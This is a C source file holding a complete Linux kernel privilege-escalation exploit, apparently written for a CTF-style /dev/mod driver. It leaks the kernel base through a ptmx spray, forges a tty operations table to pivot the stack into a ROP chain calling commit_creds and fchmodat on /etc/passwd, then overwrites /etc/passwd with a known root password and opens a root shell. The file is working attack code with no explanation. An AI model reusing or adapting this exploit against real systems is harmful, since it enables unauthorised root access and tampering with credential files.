#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdint.h>
#include <pty.h>
#include <sys/user.h>
#include <assert.h>
#include <pthread.h>

#define ull unsigned long long
#define LOCK_BOX 0x1337
#define UNLOCK_BOX 0x1338
#define SET_BOX 0x1339
#define RESIZE_BOX 0x133a
#define box_unlock() box_lock()
#define sBox struct box
#define commit_creds kbase + 0x80010
#define prepare_kernel_cred kbase + 0x803e0
#define stack_pivot_gadget kbase + 0x8e7bdb
// mov    esp,0xf6000000; ret
#define pop_rdi_ret kbase + 0x3707ec
#define pop_rdx_rdi_ret kbase + 0x3707eb
#define pop_rsi_ret kbase + 0x1f1b5
#define mov_rdi_rax kbase + 0x8e21c
#define fchmodat kbase + 0x190cc0
#define msleep kbase + 0xbc9e0

 
struct box {
	uint64_t size;
	uint64_t key;
	void * ptr;
} Box;

int fd;

int box_lock()
{
	return ioctl(fd, LOCK_BOX, &Box.key);
}

int box_set(ull key)
{
	Box.key = key;
	return ioctl(fd, SET_BOX, &Box.key);
}

int box_resize(uint64_t size)
{
	Box.size = size;
	return ioctl(fd, RESIZE_BOX, &Box.size);
}

void * dev_mmap(void * addr, uint64_t size)
{
	void * _addr = mmap(addr, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	return _addr;
}

void shell()
{
	puts("[+] Waiting");
	sleep(5);
	char * passwd = "root:6yJpcMmL6GY4c:0:0:root:/root:/bin/sh\nuser:x:1000:1000:Linux User,,,:/home/user:/bin/sh";
	int pfd = open("/etc/passwd", O_WRONLY);
	write(pfd, passwd, strlen(passwd));
	close(pfd);
	puts("[+] Login with password: toor");
	system("/bin/sh");
}
char * fake_stack = NULL;
void exploit()
{
	pthread_t p_thread;
        box_set(0x2000);
	int ptmx[0x30];
	for(int i=0;i<0x30;++i)
		ptmx[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	for(int i=0;i<3;++i)
		box_resize(24);
	int fds[0x20];
	int bak = fd;
	for(int i=0;i<0x20;++i)
	{
		fds[i] = open("/dev/mod", O_RDWR);
		fd = fds[i];
		box_set(0x1337+i);
		box_resize(0x400);
	}
	fd = bak;
	Box.key = 0x2000;
	ull * addr = 0x13370000LL;
	box_lock();
	for(int i=0;i<0x20;++i)
	{
		fd = fds[i];
		Box.key = 0x1337+i;
		if(box_lock() == -1)
		{
			box_unlock();
			printf("Found at idx: %d\n", i);
			dev_mmap(0x13370000LL, 0x2000);
			fd = bak;
			Box.key = 0x2000;
			box_unlock();
			break;
		}
		box_unlock();
	}
	
	ull ptm_ops = NULL;
	int i;
	for(i=0;i<0x2000/8;++i)
	{
		if((addr[i] & 0xffff) == 0xf260)
		{
			ptm_ops = addr[i];
			break;
		}
	}
	if(!ptm_ops)
	{
		puts("Run again");
		exit(1);
	}
	pthread_create(&p_thread, NULL, shell, NULL);
	ull kbase = ptm_ops - 0xa5f260;
	printf("[+] kernel base: %p\n", kbase);
	int idx = 0;
	ull * ropchain = 0xf6000000;
	char *file = "/etc/passwd";
	ropchain[idx++] = pop_rdi_ret;
	ropchain[idx++] = 0;
	ropchain[idx++] = prepare_kernel_cred;
	ropchain[idx++] = mov_rdi_rax;
	ropchain[idx++] = commit_creds;
	ropchain[idx++] = pop_rdx_rdi_ret;
	ropchain[idx++] = 0777;
	ropchain[idx++] = 0;
	ropchain[idx++] = pop_rsi_ret;
	ropchain[idx++] = file;
	ropchain[idx++] = fchmodat;
	ropchain[idx++] = pop_rdi_ret;
	ropchain[idx++] = 0x100000;
	ropchain[idx++] = msleep;
	ull * fake_ops = malloc(0x400);
	memset((void *)fake_ops, 0, 0x400);
	fake_ops[12] = stack_pivot_gadget; // ptm_unix98_ops.ioctl
	addr[i] = (void *)fake_ops;
	for(int i=0;i<0x30;++i)
		ioctl(ptmx[i], 0xdeadbeef, 0xdeadbeef);
}

int main() {
	fd = open("/dev/mod", O_RDWR);
	assert(fd > 0);
	fake_stack = mmap(0xf6000000-0x50000, 0x100000, 0x7, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
	exploit();
	close(fd);
}
